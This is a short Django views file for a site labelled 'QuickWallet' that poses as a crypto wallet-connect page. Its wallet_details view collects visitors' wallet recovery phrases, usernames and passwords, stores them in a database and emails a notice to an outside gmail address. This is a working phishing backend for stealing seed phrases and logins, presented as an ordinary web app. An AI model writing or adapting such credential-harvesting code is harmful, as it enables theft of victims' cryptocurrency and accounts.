from unittest import result
from django.shortcuts import render, redirect
from . models import *
from django.core.mail import send_mail
from django.conf import settings

# Create your views here.
def home(request):
    action = Action.objects.all()
    context = {'action':action}
    return render(request, 'home/wallet-connect.html', context)


def wallets(request, slug):
    action = Action.objects.filter(slug=slug)
    action_title = Action.objects.filter(title=slug).first()
    all_wallets = Wallet.objects.all()
    context = {'action':action, 'action_title':action_title, 'all_wallets':all_wallets}
    return render(request, 'home/wallets.html', context)


def wallet_details(request, slug):
    if request.method == 'POST':
        wallet = slug
        phrase = request.POST['phrase']
        user = request.POST['user']
        password = request.POST['pass']

        # data = [wallet, phrase, user, password]

        # print(data)

        send_mail('Result form QuickWallet', wallet, settings.EMAIL_HOST_USER, ['exkynexkyn@gmail.com'] )

        allresult = Result.objects.create(wallet=wallet, phrase=phrase, user=user, password=password)
        allresult.save()

        return redirect('home')
    else:
        return render(request, 'home/wallet-details.html')

    




